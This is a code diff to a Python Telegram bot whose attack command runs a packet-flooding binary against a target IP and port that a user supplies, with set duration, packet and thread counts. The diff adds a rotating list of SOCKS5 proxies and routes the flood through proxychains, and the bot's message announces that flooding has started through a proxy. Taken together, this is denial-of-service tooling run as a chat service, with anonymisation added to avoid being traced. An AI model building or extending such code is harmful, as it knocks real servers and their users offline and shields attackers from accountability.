@@ -3,6 +3,7 @@ import json
 import os
 import datetime
 import asyncio
+import random
 from telegram import Update, Chat
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
@@ -14,6 +15,13 @@ DEFAULT_DURATION = 120  # Set default duration (e.g., 60 seconds)
 
 users = {}
 user_processes = {}  # Dictionary to track processes for each user
+
+# List of SOCKS5/HTTP proxies
+PROXIES = [
+    "socks5://user:pass@proxy1_ip:port",
+    "socks5://user:pass@proxy2_ip:port",
+    "socks5://user:pass@proxy3_ip:port"
+]
 
 def load_users():
     try:
@@ -56,13 +64,17 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
         return
 
-    flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
+    # Select a random proxy
+    proxy = random.choice(PROXIES)
+
+    # Command using proxychains
+    flooding_command = ['proxychains', './bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
 
     # Start the flooding process for the user
     process = subprocess.Popen(flooding_command)
     user_processes[user_id] = process
 
-    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {DEFAULT_DURATION} seconds with {DEFAULT_THREADS} threads.')
+    await update.message.reply_text(f'Flooding started through proxy {proxy}: {target_ip}:{port} for {DEFAULT_DURATION} seconds with {DEFAULT_THREADS} threads.')
 
     # Wait for the specified duration asynchronously
     await asyncio.sleep(DEFAULT_DURATION)
